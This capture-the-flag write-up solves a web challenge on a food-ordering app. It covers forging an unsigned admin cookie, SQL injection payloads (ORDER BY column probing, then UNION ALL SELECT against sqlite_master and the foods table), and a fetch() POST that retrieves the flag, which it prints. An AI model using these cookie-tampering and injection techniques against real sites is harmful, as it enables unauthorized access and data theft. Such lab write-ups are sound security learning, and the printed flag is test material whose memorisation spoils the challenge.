# Expensey Eats

## Description

Food is expensive these days.

## Solution Walkthrough

First, we can see that their cookies are not signed, so we can directly change `admin: false` to `true`. After making this change, we can access `/admin`.

Next, I tested the "Food Items" section and found it was vulnerable to SQL Injection. However, the flag was not in the initial results, so I tried using a `UNION` attack to list it.

To find the total number of columns, I tried from `' ORDER BY 1-- -` all the way to `' ORDER BY 10-- -` before an internal error finally occurred. From this, I inferred that there are a total of 9 columns.

Next, I used `' AND 1=0 UNION ALL SELECT 1,1,1,1,1,1,sql,1,1 FROM sqlite_master WHERE type='table'-- -` to view the SQL statements.

![alt text](image-1.png)

After looking through it, I figured that "Flag Foie Fantasia" inside `foods` was the flag. So, I used `' AND 1=0 UNION ALL SELECT 1,1,1,1,id,1,name,1,1 FROM foods-- -` to get its ID, which turned out to be 7.

![alt text](image.png)

The previous step was actually redundant. After reading the description later, I went to Restaurant 1 (Truffle Tower) first, changed the flag quantity to > 0, and then sent a POST request to get the flag.

```js
fetch("https://dalctf-expensey-eats-183-64616c.instancer.dalctf2026.com/order/7", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-Hant;q=0.6,und;q=0.5",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "priority": "u=0, i",
    "sec-ch-ua": "\"Chromium\";v=\"148\", \"Vivaldi\";v=\"8.0\", \"Not/A)Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://dalctf-expensey-eats-183-64616c.instancer.dalctf2026.com/menu",
  "body": "quantity=1&delivery_note=",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

![alt text](image-2.png)

## Flag

```text
dalctf{7h4t_w45_3xp3n5Iv3_4f}
```
